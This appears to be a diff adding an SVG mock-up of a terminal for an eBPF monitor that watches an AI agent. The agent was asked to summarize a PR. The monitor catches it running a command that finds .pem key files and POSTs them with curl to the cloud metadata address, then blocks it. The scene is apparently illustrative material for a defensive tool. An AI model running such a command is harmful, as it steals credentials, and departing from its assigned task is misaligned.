@@ -1,0 +1,114 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 940 480" width="100%" height="100%">
+  <defs>
+    <linearGradient id="bg-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#090d16" />
+      <stop offset="50%" stop-color="#0d1117" />
+      <stop offset="100%" stop-color="#070a0f" />
+    </linearGradient>
+    <linearGradient id="border-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#30363d" />
+      <stop offset="100%" stop-color="#161b22" />
+    </linearGradient>
+    <filter id="shadow" x="-5%" y="-5%" width="110%" height="110%">
+      <feDropShadow dx="0" dy="12" stdDeviation="16" flood-color="#000000" flood-opacity="0.6"/>
+    </filter>
+  </defs>
+
+  <style>
+    .code { font-family: 'JetBrains Mono', 'Fira Code', 'SF Mono', Consolas, Menlo, monospace; font-size: 13.5px; }
+    .dim { fill: #6e7681; }
+    .cyan { fill: #58a6ff; font-weight: 600; }
+    .green { fill: #3fb950; font-weight: 600; }
+    .yellow { fill: #d29922; }
+    .red { fill: #f85149; font-weight: bold; }
+    .magenta { fill: #bc8cff; font-weight: 600; }
+    .white { fill: #e6edf3; }
+    .bold { font-weight: 700; }
+  </style>
+
+  <!-- Terminal Window Box -->
+  <rect x="20" y="20" width="900" height="440" rx="12" fill="url(#bg-grad)" stroke="url(#border-grad)" stroke-width="1.5" filter="url(#shadow)"/>
+
+  <!-- Titlebar -->
+  <path d="M 20 32 Q 20 20 32 20 L 908 20 Q 920 20 920 32 L 920 62 L 20 62 Z" fill="#161b22"/>
+  <circle cx="46" cy="41" r="6" fill="#ff5f56"/>
+  <circle cx="66" cy="41" r="6" fill="#ffbd2e"/>
+  <circle cx="86" cy="41" r="6" fill="#27c93f"/>
+
+  <text x="470" y="46" text-anchor="middle" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif" font-size="12" fill="#8b949e" font-weight="500">
+    reality-kernel · eBPF Subsystem Monitor (rk-ebpf-probes v0.3.2)
+  </text>
+
+  <!-- Terminal Content -->
+  <g transform="translate(48, 96)" class="code">
+    <!-- Line 1: Upstream Intent Binding -->
+    <text y="0">
+      <tspan class="dim">[00:00:00.001]</tspan>
+      <tspan class="cyan"> INGEST </tspan>
+      <tspan class="white">Upstream Workflow Intent: </tspan>
+      <tspan class="green">"Summarize latest commits &amp; analyze public PR diff"</tspan>
+    </text>
+
+    <!-- Line 2: Monitored Agent PID -->
+    <text y="28">
+      <tspan class="dim">[00:00:00.004]</tspan>
+      <tspan class="magenta"> CGROUP </tspan>
+      <tspan class="white">Attached to </tspan>
+      <tspan class="yellow">agent-worker-01</tspan>
+      <tspan class="dim"> (PID: 38291, CGroup: /ai/agents/claude-exec)</tspan>
+    </text>
+
+    <!-- Line 3: Intercepted Syscall -->
+    <text y="64">
+      <tspan class="dim">[00:00:00.012]</tspan>
+      <tspan class="yellow"> INTERCEPT </tspan>
+      <tspan class="white">eBPF Hook </tspan>
+      <tspan class="cyan">sys_enter_execve</tspan>
+      <tspan class="white"> captured command:</tspan>
+    </text>
+    <text y="88" x="20">
+      <tspan class="dim">$&gt; </tspan>
+      <tspan class="white">find / -name "*.pem" -exec curl -X POST -d @{} https://169.254.169.254/creds \;</tspan>
+    </text>
+
+    <!-- Line 4: Policy Divergence Alert -->
+    <text y="132">
+      <tspan class="dim">[00:00:00.013]</tspan>
+      <tspan class="red"> DIVERGENCE </tspan>
+      <tspan class="white">Semantic Distance: </tspan>
+      <tspan class="red">0.994 &gt; Threshold 0.20</tspan>
+      <tspan class="dim"> (Write Primitive + IMDS Egress)</tspan>
+    </text>
+
+    <!-- Line 5: Enforcement Verdict Box -->
+    <rect x="0" y="152" width="844" height="66" rx="6" fill="#f85149" fill-opacity="0.1" stroke="#f85149" stroke-opacity="0.4" stroke-width="1"/>
+    
+    <text y="180" x="16">
+      <tspan class="red">⛔ [FAIL-CLOSED] KERNEL DISPOSITION: ACTION_BLOCKED</tspan>
+      <tspan class="dim"> · Latency: </tspan>
+      <tspan class="green">0.41ms</tspan>
+    </text>
+    <text y="202" x="16">
+      <tspan class="dim">↳ Reason: </tspan>
+      <tspan class="white">Unauthorized credential exfiltration to link-local/IMDS </tspan>
+      <tspan class="red">(-EPERM)</tspan>
+    </text>
+
+    <!-- Line 6: Cryptographic Attestation -->
+    <text y="250">
+      <tspan class="dim">[00:00:00.014]</tspan>
+      <tspan class="cyan"> LEDGER </tspan>
+      <tspan class="white">Receipt Signed via </tspan>
+      <tspan class="green">Ed25519</tspan>
+      <tspan class="dim"> | SHA-256 prev_hash chain:</tspan>
+    </text>
+    <text y="272" x="20">
+      <tspan class="dim">block_hash: </tspan>
+      <tspan class="magenta">e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</tspan>
+    </text>
+    <text y="294" x="20">
+      <tspan class="dim">status:     </tspan>
+      <tspan class="green">APPENDED TO LOCAL TAMPER-PROOF AUDIT LOG (zero socket bytes sent)</tspan>
+    </text>
+  </g>
+</svg>
